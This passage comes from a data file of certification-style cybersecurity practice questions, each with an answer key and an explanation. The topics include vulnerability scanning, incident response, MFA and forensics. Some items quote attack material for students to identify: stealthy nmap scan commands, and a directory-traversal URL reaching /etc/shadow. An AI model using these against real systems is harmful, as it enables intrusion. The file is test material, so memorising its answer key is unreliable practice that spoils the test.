credit cards. Thus, knowing the IP address from which an attack originated will typically not provide information about an attacker. In some cases, deeper research can identify where an attack originated, but even then, knowing the identity of an attacker is rarely certain.","l":"c4-classify","l2":"","k":"threat actor IP attribution"},{"id":"pt1-48","set":"pt1","ch":11,"d":3,"q":"After a major compromise involving what appears to be an APT, Jaime needs to conduct a forensic examination of the compromised systems. Which containment method should he recommend to ensure that he can fully investigate the systems that were involved while minimizing the risk to his organization’s other production systems?","o":["Sandboxing","Removal","Isolation","Segmentation"],"a":1,"e":"Completely removing the systems involved in the compromise will ensure that they cannot impact the organization’s other production systems. Although attackers may be able to detect this change, it provides the best protection possible for the organization’s systems.","l":"c11-contain","l2":"","k":"incident containment removal strategy"},{"id":"pt1-49","set":"pt1","ch":6,"d":2,"q":"Piper is attempting to remediate a security vulnerability and must apply a patch to a production database server. The database administration team is concerned that the patch will disrupt business operations. How should Piper proceed?","o":["She should deploy the patch immediately on the production system.","She should wait 60 days to deploy the patch to determine whether bugs are reported.","She should deploy the patch in a sandbox environment to test it before applying it in production.","She should contact the vendor to determine a safe time frame for deploying the patch in production."],"a":2,"e":"Piper should deploy the patch in a sandbox environment and then thoroughly test it before releasing it in production. This approach reduces the risk that the patch will not work well in her environment. Simply asking the vendor or waiting 60 days may identify some issues, but it does not sufficiently reduce the risk because the patch will not have been tested in her company’s environment.","l":"c6-remediation","l2":"","k":"patch testing and implementation"},{"id":"pt1-50","set":"pt1","ch":6,"d":2,"q":"Kent ran a vulnerability scan of an internal CRM server that is routinely used by employees, and the scan reported that no services were accessible on the server. Employees continued to use the CRM application over the web without difficulty during the scan. What is the most likely source of Kent’s result?","o":["The server requires strong authentication.","The server uses encryption.","The scan was run from a different network perspective than user traffic.","The scanner’s default settings do not check the ports used by the CRM application."],"a":2,"e":"The most likely scenario is that Kent ran the scan from a network that does not have access to the CRM server. Even if the server requires strong authentication and/or encryption, this would not prevent ports from appearing as open on the vulnerability scan. The CRM server runs over the web, as indicated in the scenario. Therefore, it is most likely using ports 80 and/or 443, which are part of the default settings of any vulnerability scanner.","l":"c6-config","l2":"","k":"vulnerability scan perspective"},{"id":"pt1-51","set":"pt1","ch":5,"d":2,"q":"Steve needs to perform an Nmap scan of a remote network and wants to be as stealthy as possible. Which of the following <code>nmap</code> commands will provide the stealthiest approach to his scan?","o":["<code>nmap -Pn -sT 10.0.10.0/24</code>","<code>nmap -sT -T0 10.0.10.0/24</code>","<code>nmap -Pn -sS 10.0.10.0/24</code>","<code>nmap -Pn -sS -T0 10.0.10.0/24</code>"],"a":3,"e":"Nmap provides multiple scan modes, including a TCP SYN scan, denoted by the <code>-sS</code> flag. This is far stealthier than the full TCP connect scan, which uses the <code>-sT</code> flag. Turning off pings with the <code>-Pn</code> flag helps with stealth, and setting the scan speed using the <code>-T</code> flag to either a 0 for paranoid or a 1 for sneaky will help bypass many IDSs by falling below their detection threshold.","l":"c5-portscan","l2":"","k":"stealthy Nmap SYN scan"},{"id":"pt1-52","set":"pt1","ch":8,"d":2,"q":"After performing threat hunting, Lakshman determines that it would be appropriate to disable some services on his organization’s database servers. What activity is Lakshman engaging in?","o":["Establishing a hypothesis","Gathering evidence","Reducing the attack surface","Executable process analysis"],"a":2,"e":"Disabling unnecessary services reduces the attack surface by decreasing the number of possible attack vectors for gaining access to a server.","l":"c8-controls","l2":"c4-hunt","k":"attack surface reduction"},{"id":"pt1-53","set":"pt1","ch":6,"d":2,"q":"Jenna is configuring the scanning frequency for her organization’s vulnerability scanning program. Which one of the following is the least important criterion for Jenna to consider?","o":["Sensitivity of information stored on systems","Criticality of the business processes handled by systems","Operating system installed on systems","Exposure of the system to external networks"],"a":2,"e":"Of the criteria listed, the operating system installed on the systems is the least likely to have a significant impact on the likelihood and criticality of discovered vulnerabilities. All operating systems are susceptible to security issues.","l":"c6-requirements","l2":"","k":"vulnerability scan frequency criteria"},{"id":"pt1-54","set":"pt1","ch":6,"d":2,"q":"Donna is securing her organization’s network, shown here. She is reviewing a vulnerability scan and would like to determine which vulnerability to remediate first. Donna wants to focus on the most critical vulnerability based on its potential impact if exploited. Assuming the firewall is properly configured, which one of the following vulnerabilities should Donna give the highest priority?<figure><img alt=\"Network diagram shows the internet, firewall, internal network linking workstations, file server, and D M Z with email and web servers.\" loading=\"lazy\" src=\"img/pt/c05un014.png\"/></figure>","o":["Severity 5 vulnerability in the file server","Severity 3 vulnerability in the file server","Severity 4 vulnerability in the web server","Severity 2 vulnerability in the mail server"],"a":0,"e":"In this case, the identity or network location of the server is not relevant. Donna is simply interested in the most critical vulnerability, so she should select the one with the highest severity. In vulnerability severity rating systems, severity 5 vulnerabilities are the most critical and severity 1 are the least critical. Therefore, Donna should remediate the severity 5 vulnerability in the file server.","l":"c6-remediation","l2":"c7-validate","k":"vulnerability remediation severity prioritization"},{"id":"pt1-55","set":"pt1","ch":8,"d":2,"q":"Which one of the following document categories provides the highest-level authority for an organization’s cybersecurity program?","o":["Policy","Standard","Procedure","Framework"],"a":0,"e":"Policies are the highest-level component of an organization’s governance documentation. They are set at the executive level and provide strategy and direction for the cybersecurity program. Standards and procedures derive their authority from policies. Frameworks are not governance documents but rather provide a conceptual structure for organizing a program. Frameworks are usually developed by third-party organizations, such as ISACA or ISO.","l":"c8-governance","l2":"","k":"security policy governance hierarchy"},{"id":"pt1-56","set":"pt1","ch":12,"d":4,"q":"Mateo is planning a vulnerability scanning program for his organization and is scheduling weekly scans of all the servers in his environment. He was approached by a group of system administrators who asked that they be given direct access to the scan reports without going through the security team. How should Mateo respond?","o":["Mateo should provide the administrators with access.","Mateo should deny the administrators access because the information may reveal critical security issues.","Mateo should offer to provide the administrators with copies of the report after they go through a security review.","Mateo should deny the administrators access because it would allow them to correct security issues before they are analyzed by the security team."],"a":0,"e":"Vulnerability scanning information is most effective in the hands of individuals who can correct the issues. The point of scans is not to “catch” people who made mistakes. Mateo should provide the administrators with access. The security team may always monitor the system for unremediated vulnerabilities, but they should not act as a gatekeeper to critical information.","l":"c12-vuln-report","l2":"c6-remediation","k":"vulnerability report sharing with administrators"},{"id":"pt1-57","set":"pt1","ch":7,"d":2,"q":"While reviewing a report from a vulnerability scan of a web server, Paul encountered the vulnerability shown here. What is the easiest way for Paul to correct this vulnerability with minimal impact on the business?<figure><img alt=\"Screenshot lists C G I bin directory scripts vulnerability with 3 sections of Q I D, C V S S scores, threat, and impact details on port 80.\" loading=\"lazy\" src=\"img/pt/c05un015.png\"/></figure>","o":["Block ports 80 and 443.","Adjust directory permissions.","Block port 80 only to require the use of encryption.","Remove CGI from the server."],"a":1,"e":"This vulnerability results in an information disclosure issue. Paul can easily correct it by disabling the directory listing permission on the <code>cgi-bin</code> directory. This is unlikely to affect any other use of the server because he is not altering permissions on the CGI scripts themselves. Blocking access to the web server and removing CGI from the server would also resolve the vulnerability but would likely have an undesirable business impact.","l":"c7-web-ot","l2":"c7-server-network","k":"directory listing misconfiguration remediation"},{"id":"pt1-58","set":"pt1","ch":9,"d":3,"q":"A log showing a successful user authentication is classified as what type of occurrence in NIST’s definitions?","o":["A cybersecurity incident","A cybersecurity event","An event","An adverse event"],"a":2,"e":"Observable occurrences are classified as events in NIST’s scheme. Events with negative consequences are considered adverse events, while violations (or even imminent threats of violations) are classified as cybersecurity incidents.","l":"c9-process","l2":"","k":"NIST incident response event definition"},{"id":"pt1-59","set":"pt1","ch":6,"d":2,"q":"Fran is trying to run a vulnerability scan of a web server from an external network, and the scanner is reporting that there are no services running on the web server. She verified the scan configuration and attempted to access the website running on that server using a web browser on a computer located on the same external network and experienced no difficulty. What is the most likely issue with the scan?","o":["A host firewall is blocking access to the server.","A network firewall is blocking access to the server.","An intrusion prevention system is blocking access to the server.","Fran is scanning the wrong IP address."],"a":2,"e":"The most likely issue is that an intrusion prevention system (IPS) is detecting the scan as an attack and blocking the scanner. If this were a host or network firewall issue, Fran would most likely not be able to access the server using a web browser. It is less likely that the scan is misconfigured given that Fran double-checked the configuration.","l":"c6-config","l2":"","k":"IPS blocking vulnerability scanner"},{"id":"pt1-60","set":"pt1","ch":2,"d":1,"q":"During a regulatory compliance assessment, Manish discovers that his organization has implemented a multifactor authentication requirement for systems that store and handle highly sensitive data. The system requires that users provide both a password and a four-digit PIN. What should Manish note in his findings about this system?","o":["The multifactor system provides two independent factors and provides an effective security control.","The factors used are both the same type of factor, making the control less effective.","The system uses only two factors and is not a true multifactor system. To qualify as multifactor, it should include at least three factors.","The multifactor system’s use of a four-digit PIN does not provide sufficient complexity, and additional length should be required for any PIN for secure environments."],"a":1,"e":"The biggest issue in this scenario is that both factors are knowledge-based factors. A true multifactor system relies on more than one type of distinct factor, including something you know, something you have, or something you are (and sometimes somewhere you are). This system relies on two things you know, and attackers are likely to acquire both from the same location in a successful attack.","l":"c2-iam","l2":"","k":"multifactor authentication factor types"},{"id":"pt1-61","set":"pt1","ch":2,"d":1,"q":"Which one of the following mechanisms may be used to enhance security in a context-based authentication system?","o":["Time of day","Location","Device fingerprint","All of the above"],"a":3,"e":"Context-based authentication may leverage a wide variety of information. Potential attributes include time of day, location, device fingerprint, frequency of access, user roles, user group memberships, and IP address/reputation.","l":"c2-iam","l2":"","k":"context-based adaptive authentication"},{"id":"pt1-62","set":"pt1","ch":2,"d":1,"q":"Latisha’s organization has faced a significant increase in successful phishing attacks, resulting in compromised accounts. She knows that she needs to implement additional technical controls to prevent successful attacks. Which of the following controls will be the most effective while remaining relatively simple and inexpensive to deploy?","o":["Increased password complexity requirements","Application or token-based multifactor authentication","Biometric-based multifactor authentication","OAuth-based Single Sign-on"],"a":1,"e":"Application or token-based multifactor authentication ensures that the exposure of a password because of successful phishing email does not result in the compromise of the credential. Increased password complexity requirements fail to add security here since complex passwords can still be compromised by phishing attacks, biometric multifactor authentication is typically expensive to implement and requires enrollment, and OAuth-based Single Sign-on will not prevent phishing attacks; instead, it can make it easier for attackers to move between multiple services.","l":"c2-iam","l2":"","k":"phishing-resistant multifactor authentication"},{"id":"pt1-63","set":"pt1","ch":2,"d":1,"q":"Lauren downloads a new security tool and checks its SHA-256 hash. What does she know about the software she downloaded if she receives the following message?\n<p> </p>\n<pre>\n<code>root@demo:~# sha256sum -c demo.sha256</code>\n<code>demo.txt: FAILED</code>\n<code>sha256sum: WARNING: 1 computed checksum did NOT match</code>\n</pre>","o":["The file is corrupted.","Attackers have modified the file.","The files do not match.","The test failed and provided no answer."],"a":2,"e":"Lauren knows that the file she downloaded and computed a checksum for does not match the SHA-256 checksum that was calculated by the providers of the software. She does not know if the file is corrupted or if attackers have modified the file but may want to contact the providers of the software to let them know about the issue. She definitely shouldn’t execute or trust the file!","l":"c2-crypto","l2":"","k":"cryptographic hash integrity verification"},{"id":"pt1-64","set":"pt1","ch":2,"d":1,"q":"A company recently implemented a privileged access management solution to reduce the risk associated with administrative accounts. The security team wants to ensure that domain administrator credentials are not permanently assigned to any individual user and that all privileged activity is logged. Which of the following features best addresses this requirement?","o":["Assigning shared administrator accounts with complex passwords that are rotated quarterly","Requiring multifactor authentication for all standard user accounts","Implementing just-in-time access with session recording and automatic credential rotation","Disabling local administrator accounts on all workstations"],"a":2,"e":"Just-in-time access provisions elevated privileges only when needed and for a limited duration, reducing standing administrative rights. Session recording provides accountability by logging privileged activity, and automatic credential rotation prevents reuse or long-term exposure of high-value credentials. The other options may improve security, but they do not eliminate persistent privileged accounts or provide comprehensive monitoring of privileged sessions.","l":"c2-federation","l2":"","k":"privileged access management just-in-time"},{"id":"pt1-65","set":"pt1","ch":3,"d":1,"q":"Mika received a suspicious email attachment that may contain obfuscated PowerShell commands. She wants to decode and analyze the encoded strings to determine whether the script is malicious. Which tool should she use first?","o":["Wireshark","CyberChef","Snort","WHOIS"],"a":1,"e":"CyberChef is designed for exactly this kind of task, providing a flexible, browser-based environment with built-in operations for decoding, deobfuscating, and transforming data such as Base64, URL encoding, and common PowerShell obfuscation patterns, which lets Mika quickly reveal what the script is doing. Wireshark focuses on capturing and analyzing network traffic, so it would be useful later if she wanted to see how the script behaves on the network but not to decode the strings themselves. Snort is a network intrusion detection and prevention system that relies on rules to detect malicious traffic and is not a decoding or reverse-engineering tool for script content. WHOIS is used to look up domain registration information, which can help investigate suspicious domains but does nothing to decode or analyze obfuscated PowerShell commands in an email attachment.","l":"c3-tools","l2":"","k":"CyberChef decoding and deobfuscation"},{"id":"pt1-66","set":"pt1","ch":3,"d":1,"q":"An organization suspects data exfiltration from a compromised host. The security team needs to capture and inspect live network traffic to identify suspicious outbound connections and unusual protocols. Which tool would best help the team perform this task?","o":["VirusTotal","<code>tcpdump</code>","YARA","MISP"],"a":1,"e":"<code>tcpdump</code> is the most appropriate tool in this situation because it captures live network traffic at the packet level directly from the host or network interface and allows detailed inspection of outbound connections, protocols, ports, and payloads, which is exactly what is needed to investigate potential data exfiltration in real time. VirusTotal is primarily a cloud-based service for scanning files, URLs, and hashes against multiple antivirus engines and threat intel sources, and does not capture live traffic. YARA is used to create and apply rules that identify files or memory contents matching certain patterns, useful for malware hunting but not for live packet capture. MISP is a threat intelligence sharing platform focused on storing, correlating, and distributing indicators of compromise, rather than sniffing and analyzing live network packets from a suspected host.","l":"c3-tools","l2":"","k":"tcpdump packet capture"},{"id":"pt1-67","set":"pt1","ch":7,"d":2,"q":"Charles is worried about users conducting SQL injection attacks. Which of the following solutions will best address his concerns?","o":["Using secure session management","Enabling logging on the database","Performing user input validation","Implementing TLS"],"a":2,"e":"Charles should perform user input validation to strip out any SQL code or other unwanted input. Secure session management can help prevent session hijacking, logging may provide useful information for incident investigation, and implementing TLS can help protect network traffic, but only input validation helps with the issue described.","l":"c7-web-ot","l2":"c8-sdlc","k":"SQL injection input validation"},{"id":"pt1-68","set":"pt1","ch":6,"d":2,"q":"Which of the following risks is most commonly associated with vulnerability scanning activities?","o":["Attackers may learn about the vulnerabilities.","Services may be crashed by the scanner.","The vulnerability scanner may be exploited by attackers.","Too many vulnerabilities may be detected."],"a":1,"e":"The most common concern with vulnerability scanning is that it may have a service impact due to exploiting a risk or causing a denial-of-service condition. In sensitive environments, scans are sometimes run against nonproduction versions of services to help prevent this, but the most common answer is that if the service cannot survive being scanned, it is not ready to be used!","l":"c6-remediation","l2":"","k":"vulnerability scanning service disruption"},{"id":"pt1-69","set":"pt1","ch":3,"d":1,"q":"Adam finds entries in his authentication logs showing failed login attempts against many different user accounts across systems in his network. The attempts use the same small set of common passwords, such as “Password123,” “Winter2026,” and “CompanyName2026!” What type of attack has he discovered?","o":["A session hijacking attack","An on-path (man-in-the-middle) attack","A credential stuffing attack","A password spraying attack"],"a":3,"e":"Password spraying attacks try one or a small number of common passwords against many different accounts. This technique is often used to avoid account lockout mechanisms that would be triggered by many failed attempts against a single account. Credential stuffing attacks use stolen or compromised username and password combinations across multiple sites or services. Session hijacking requires the attacker to take over a valid authenticated session. An on-path attack requires the attacker to intercept traffic between two parties, allowing them to read or modify the traffic before it reaches its intended destination.\n<p>Adam could mitigate password spraying attacks by using multifactor authentication, monitoring for widespread failed login attempts, rate limiting authentication attempts, blocking known malicious sources, and using backoff algorithms or account lockout policies carefully to reduce the likelihood of account lockout abuse.</p>","l":"c3-cloud-social","l2":"","k":"password spraying attack indicator"},{"id":"pt1-70","set":"pt1","ch":12,"d":4,"q":"You are reviewing the methods that your organization uses to communicate with the media during an incident response effort. Which one of the following is not a commonly accepted practice?","o":["Inform the media immediately of developments in the investigation.","Conduct practice sessions for incident responders who communicate with the media.","Establish media briefing procedures in advance of an incident.","Maintain an incident response status document."],"a":0,"e":"Communications with the media should be carefully planned and timed to share relevant information at the appropriate moment. Organizations should not have a default policy of immediately sharing all information, as that might result in adverse publicity, create legal risk, or hinder the investigation. The other activities listed here are all best practices for incident communications.","l":"c12-ir-report","l2":"c9-foundation","k":"incident media communication strategy"},{"id":"pt1-71","set":"pt1","ch":8,"d":2,"q":"Charles reviews the source code for a web application for vulnerabilities. What type of software assessment is this?","o":["Dynamic analysis","Fuzzing","Static analysis","Reverse engineering"],"a":2,"e":"Manual or automated review of source code rather than a running application is static analysis. This can help find bugs that you cannot see in the running application or that may otherwise be missed, but it also does not test the live code. This is exactly what Charles is doing as he examines the web application for vulnerabilities. Dynamic analysis requires running the software and observing its behavior during execution, while fuzzing is a specific testing method that sends malformed or unexpected input to a running program to uncover flaws. Reverse engineering involves analyzing compiled code or a finished product to understand how it works, typically when source code is not available, so it does not best match a direct source code review.","l":"c8-appsec","l2":"","k":"static application security testing"},{"id":"pt1-72","set":"pt1","ch":7,"d":2,"q":"Isaac sees the following entry in his web logs. What type of attack has been attempted?\n<p> </p>\n<pre>\n<code>http://example.com/../../../../../etc/shadow</code>\n</pre>","o":["A buffer overflow attack","An attack on the heap","A session hijacking attack","A directory traversal attack"],"a":3,"e":"This query attempts to traverse directories from the directory the web server is running in, until it can access <code>/etc/shadow</code>. If the web application does not have appropriate filters or the system does not have appropriate permissions set to prevent this, the attacker will be able to download <code>/etc/shadow</code>, the password store for Linux systems. A buffer overflow would typically have data passed to a variable and then code that would be executed once the buffer was overflowed and the additional contents were placed into memory. There is no session data, and there is no indication of data that would be placed on the heap of a system.","l":"c7-web-ot","l2":"","k":"directory traversal web attack"},{"id":"pt1-73","set":"pt1","ch":3,"d":1,"q":"Anita needs to determine whether a suspicious executable matches known malware signatures and behavioral indicators across multiple antivirus engines. Which tool would best assist with this analysis?","o":["Strings","Snort","VirusTotal","OpenUBA"],"a":2,"e":"VirusTotal is the best fit in this scenario because it lets Anita submit a suspicious executable and compare it against detections from many antivirus engines along with related reputation and behavioral context. It is ideal for quickly determining whether the file matches known malware indicators. Strings only extract readable text from a binary and can provide clues, but they do not validate the file against known signatures across multiple engines. Snort is a network intrusion detection and prevention tool focused on inspecting network traffic, so it would not directly assess the malware reputation of an executable file. OpenUBA is oriented toward user and entity behavior analytics in an environment, which can help spot anomalous activity, but OpenUBA is not a multi-engine malware scanning and signature comparison service for a single executable.","l":"c3-filesandbox","l2":"","k":"VirusTotal multiscanner malware analysis"},{"id":"pt1-74","set":"pt1","ch":12,"d":4,"q":"Rob would like to perform a root-cause analysis in the wake of an incident. He will be including the results of that analysis in his incident report. What action should he take first?","o":["Document the analysis.","Differentiate between each of the events and causal factors.","Identify the problems and events that occurred.","Establish a timeline."],"a":2,"e":"Rob should undertake all four of these steps during his root-cause analysis, but he should understand the appropriate sequence:<ol class=\"decimal\">\n<li>Identify the problems and events that occurred as part of the incident, and describe them as well as possible.</li>\n<li>Establish a timeline of events. This helps to determine what happened and in what order to help identify the root cause (or causes).</li>\n<li>Differentiate between each of the events and causal factors. In short, you need to determine which cause is a root cause, which are results of the root cause, and which are causal factors, or events that contributed to the issue but were not the root cause.</li>\n<li>Document the root-cause analysis, often through the use of a diagram or chart.</li></ol>","l":"c12-ir-report","l2":"c9-process","k":"root-cause analysis process steps"},{"id":"pt1-75","set":"pt1","ch":8,"d":2,"q":"What are activities like disabling unnecessary processes, moving systems to internal IP addresses, and using firewalls and other network security devices to protect hosts known as in the context of threat hunting?","o":["Establishing a hypothesis","Conducting a security lockdown","Reducing the attack surface","Bundling critical assets"],"a":2,"e":"An important part of threat hunting is reducing your own organization’s attack surface. This can involve any activity that reduces the systems or services that an attacker can potentially map or attack. Establishing a hypothesis is part of identifying your threat model but doesn’t involve these activities, and bundling critical assets is used to gather similar assets together for assessment and threat modeling activities. Conducting a security lockdown is not a common threat hunting term.","l":"c8-controls","l2":"c4-hunt","k":"attack surface reduction techniques"},{"id":"pt1-76","set":"pt1","ch":7,"d":2,"q":"Bob is creating a report to management summarizing the result of a recent vulnerability scan. He would like to prioritize the results. Which one of the following tools would provide the most comprehensive assessment of the risk posed by each vulnerability?","o":["CVSS score","Confidentiality rating","Impact rating","Likelihood rating"],"a":0,"e":"The Common Vulnerability Scoring System (CVSS) is a standardized approach to assessing the risk posed by a vulnerability. It brings together both likelihood and impact (confidentiality, integrity, and availability) ratings into a single measure and, therefore, is the most comprehensive of these approaches.","l":"c7-cvss","l2":"","k":"CVSS vulnerability severity rating"},{"id":"pt1-77","set":"pt1","ch":12,"d":4,"q":"Kelly’s organization recently suffered a security incident where the attacker was present on her network for several months before the SOC identified the attack. Once the organization saw evidence of the attack, they quickly reacted to contain the incident. Which incident response metric would suffer most as a result of this performance?","o":["Mean time to respond","Mean time to remediate","Alert volume","Mean time to detect"],"a":3,"e":"The issue in this case is that the SOC did not detect the incident for several months. This would impact the mean time to detect metric. The organization did quickly respond and remediate the incident once it was detected. This was only a single incident, so it should have no noticeable impact on alert volume.","l":"c12-ir-report","l2":"","k":"mean time to detect metric"},{"id":"pt1-78","set":"pt1","ch":1,"d":1,"q":"Seth is trying to identify activities in his organization that might be automated to improve efficiency. Which one of the following activities is least likely to benefit from automation?","o":["Threat hunting","Intrusion analysis","Qualitative risk assessment","Data backup"],"a":2,"e":"It is likely that Seth’s organization will find some efficiencies by adding automation to their technical activities, including threat hunting, intrusion analysis, and data backup. Qualitative risk analysis is a nontechnical activity and focuses on human thought. It is, therefore, the least likely candidate for automation of the activities on this list.","l":"c1-efficiency","l2":"","k":"cybersecurity automation applicability"},{"id":"pt1-79","set":"pt1","ch":3,"d":1,"q":"Rae wants to use digital signatures to verify that incoming messages genuinely originated from the domain they claim to be from, reducing the amount of spam that her organization receives. Which of the following techniques or methods will most directly fit her needs?","o":["Spamhaus","DKIM","SPF","RBL"],"a":1,"e":"DomainKeys Identified Mail (DKIM) uses digital signatures to validate that the claimed domain of the sender is the actual sender’s domain. Sender Policy Framework (SPF) records identify the mail servers that can send email from your domain but do not prove the sender’s domain. Spamhaus is an antispam organization, and an RBL is a real-time black hole list, which is a list of untrusted or spam-sending hosts.","l":"c3-filesandbox","l2":"","k":"DKIM email cryptographic authentication"},{"id":"pt1-80","set":"pt1","ch":8,"d":2,"q":"Your organization recently suffered a series of serious vulnerabilities as a result of the use of legacy software that is no longer supported by the vendor. This software is critical to your organization and can’t be removed for at least 6 more months. What action plan would best address this risk during that 6-month period?","o":["Awareness, training, and education","Compensating controls","Patch management","Changing business requirements"],"a":1,"e":"You should implement compensating controls that mitigate the risk of the legacy systems. For example, you might place the systems on an isolated network where they are less susceptible to direct attack. Awareness, training, and education may be helpful, but it would not address the risk as completely as a compensating control. Patch management is not possible because the software is no longer supported by the vendor, so no new patches will be issued. Changing business requirements is not a feasible solution because the system is needed for 6 more months.","l":"c8-governance","l2":"c8-controls","k":"compensating controls for legacy systems"},{"id":"pt1-81","set":"pt1","ch":4,"d":1,"q":"Yolanda received a threat intelligence report and is evaluating it to determine whether her organization runs any of the software affected by the threat. What type of confidence is Yolanda attempting to gain?","o":["Timeliness","Accuracy","Relevancy","Superficial"],"a":2,"e":"The three types of confidence in a threat intelligence report are timeliness, relevance, and accuracy. Yolanda is assessing whether this threat affects her organization, which is a measure of relevancy. There is no indication that Yolanda suspects that the report is outdated or inaccurate.","l":"c4-collect","l2":"","k":"threat intelligence confidence relevancy"},{"id":"pt1-82","set":"pt1","ch":2,"d":1,"q":"Gabby’s organization captures sensitive customer information, and salespeople and others often work with that data on local workstations and laptops. After a recent inadvertent breach where a salesperson accidentally sent a spreadsheet of customer information to another customer, her organization is seeking a technology solution that can help prevent similar problems. What should Gabby recommend?","o":["IDS","FSB","DLP","FDE"],"a":2,"e":"Data loss prevention (DLP) can tag sensitive data and then scan outbound communications for that data. Once tagged data or data that matches specific patterns such as credit card numbers or Social Security numbers are discovered, DLP can alert the user or take other action. IDS, an intrusion detection system, might be able to detect patterns but could not stop traffic flow. FSB is not a security term, and full-disk encryption (FDE) can help prevent data loss if a system is stolen.","l":"c2-crypto","l2":"c3-host","k":"data loss prevention data exfiltration"},{"id":"pt1-83","set":"pt1","ch":3,"d":1,"q":"Fred is reviewing a checklist used in the automation of his security program and sees the following code. What file type from the following list is he most likely reviewing?<figure><img alt=\"Code shows X M L formatted X C C D F security checklist program with test result, target facts, rule results, and fix command details.\" loading=\"lazy\" src=\"img/pt/c05un016.png\"/></figure>","o":["Plaintext","JSON","XML","HTML"],"a":2,"e":"Fred is most likely reviewing an XML file. JSON uses a series of curly brackets ({ and }), and those do not appear in this sample. Plaintext is generally not structured, and this sample is highly structured. Both XML and HTML use angle brackets (<code>&lt;</code> and <code>&gt;</code>) to indicate code elements. We can eliminate HTML because it uses specific tags, such as <code>&lt;A&gt;,</code> <code>&lt;HEAD&gt;</code>, and <code>&lt;H1&gt;</code> that do not appear in this sample. XML provides a much more flexible format that can use any tags desired by the developer.","l":"c3-uba-scripting","l2":"","k":"XML structured data format"},{"id":"pt1-84","set":"pt1","ch":10,"d":3,"q":"Cynthia’s organization receives a letter from a company they are a service provider for, notifying them of a pending legal case and telling them not to delete or discard documents related to the case. What term describes this?","o":["Legal hold","Litigation priority","Criminal suspension","A data summons"],"a":0,"e":"Legal or litigation holds are notifications sent to inform an organization or individual that they should not delete data or destroy records that may be relevant to a new or pending legal case. The remaining options are made up.","l":"c10-analysis","l2":"","k":"litigation legal hold notification"},{"id":"pt1-85","set":"pt1","ch":10,"d":3,"q":"As part of his forensic investigation, Alex signs and notes in his log when the drive copy he prepared is transferred to legal counsel. What is this process known as?","o":["Handoff documentation","Chain of custody tracking","Asset tracking","Forensic certification"],"a":1,"e":"Chain of custody tracking determines who has access to and authority over drives, devices, and forensic data throughout its life cycle. This is a critical element in investigations that may end up in court or that will involve law enforcement.","l":"c10-analysis","l2":"","k":"chain of custody tracking"},{"id":"pt2-1","set":"pt2","ch":1,"d":1,"q":"Ty is reviewing the scan report for a Windows system joined to his organization’s domain and finds the vulnerability shown here. What should be Ty’s most significant concern related to this vulnerability?\n<figure>\n<img alt=\"Screenshot details administrator password expiry vulnerability with Q I D, C V S S scores, and S A M database threat description.\" loading=\"lazy\" src=\"img/pt/c06un001.png\"/>\n</figure>","o":["The presence of this vulnerability indicates that an attacker may have compromised Ty’s network.","The presence of this vulnerability indicates a misconfiguration on the target server.","The presence of this vulnerability indicates that the domain security policy may be lacking appropriate controls.","The presence of this vulnerability indicates a critical flaw on the target server that must be addressed immediately."],"a":2,"e":"The presence of this vulnerability does indicate a misconfiguration on the targeted server, but that is not the most significant concern that Ty should have. Rather, he should be alarmed that the domain security policy does not prevent a non-expiring password configuration and should know that many other systems on the network may be affected. This vulnerability is not an indicator of an active compromise and does not rise to the level of a critical flaw.","l":"c1-endpoint-pentest","l2":"c7-server-network","k":"domain group policy security controls"},{"id":"pt2-2","set":"pt2","ch":7,"d":2,"q":"Heidi runs a vulnerability scan of the management interface of her organization’s virtualization platform and finds the severity 1 vulnerability shown here. What circumstance, if present, should increase the severity level of this vulnerability to Heidi?\n<figure>\n<img alt=\"Screenshot details remote management service accepting unencrypted credentials detections with Q I D, category, and C V S S score data.\" loading=\"lazy\" src=\"img/pt/c06un002.png\"/>\n</figure>","o":["Lack of encryption","Missing security patch","Exposure to external networks","Out-of-date antivirus signatures"],"a":2,"e":"This vulnerability has a low severity, but that could be dramatically increased if the management interface is exposed to external networks. If that were the case, it is possible that an attacker on a remote network would be able to eavesdrop on administrative connections and steal user credentials. Out-of-date antivirus definitions and missing security patches may also be severe vulnerabilities, but they do not increase the severity of this specific vulnerability. The lack of encryption is already known because of the nature of this vulnerability, so confirming that fact would not change the severity assessment.","l":"c7-validate","l2":"c6-remediation","k":"vulnerability prioritization network exposure"},{"id":"pt2-3","set":"pt2","ch":7,"d":2,"q":"Rowan ran a port scan against a network switch located on her organization’s internal network and discovered the results shown here. She ran the scan from her workstation on the employee VLAN. Which one of the following results should be of greatest concern to her?\n<figure>\n<img alt=\"Screenshot details N map scan report for 10.1.0.121 listing 9 ports with open and filtered state completed in 5.29 seconds.\" loading=\"lazy\" src=\"img/pt/c06un003.png\"/>\n</figure>","o":["Port 22","Port 23","Port 80","Ports 8192 to 8194"],"a":1,"e":"Both ports 22 and 23 should be of concern to Rowan because they indicate that the network switch is accepting administrative connections from a general-use network. Instead, the switch should accept administrative connections only from a network management VLAN. Of these two results, port 23 should be of the greatest concern because it indicates that the switch is allowing unencrypted telnet connections that may be subject to eavesdropping. The results from ports 80, 631, and 8192 to 8194 are of lesser concern because they are being filtered by a firewall.","l":"c7-server-network","l2":"c5-portscan","k":"unencrypted Telnet management protocol"},{"id":"pt2-4","set":"pt2","ch":6,"d":2,"q":"Evan is troubleshooting a vulnerability scan issue on his network. He is conducting an external scan of a website located on the web server shown in the diagram. After checking the web server logs, he saw no sign of the scan requests. Which one of the following causes is the least likely issue for him to troubleshoot?\n<figure>\n<img alt=\"Network diagram shows the internet, firewall, and internal network linked by 3 I P S devices, with screened subnet servers and workstations.\" loading=\"lazy\" src=\"img/pt/c06un004.png\"/>\n</figure>","o":["The scans are being blocked by an intrusion prevention system.","The scans are being blocked by a rule within the web server application.","The scans are being blocked by a network firewall.","The scans are being blocked by a host firewall."],"a":1,"e":"All of the scenarios described here could result in failed vulnerability scans and are plausible on this network. However, the fact that the web server logs do not show any denied requests indicates that the issue is not with the web server application itself. If this were the case, Evan would see evidence of it in the web server logs.","l":"c6-config","l2":"","k":"WAF blocking vulnerability scanner"},{"id":"pt2-5","set":"pt2","ch":2,"d":1,"q":"What component of a Zero Trust Network Access (ZTNA) architecture evaluates trust scores and determines whether a requested session should be authorized?","o":["The Policy Enforcement Point","The Policy Decision Point","The Identity Provider","The Endpoint"],"a":1,"e":"Policy decision points make decisions based on policies. They evaluate trust scores and determine whether a requested session should be authorized based on those policies. Policy enforcement points execute decisions made by PDPs, identities are managed by identity providers, and endpoints connect to gateways or connectors through secure clients.","l":"c2-netarch","l2":"","k":"Zero Trust Policy Decision Point"},{"id":"pt2-6","set":"pt2","ch":8,"d":2,"q":"Mila wants to test code by running it and evaluating it for flaws. What sort of testing mechanism should she 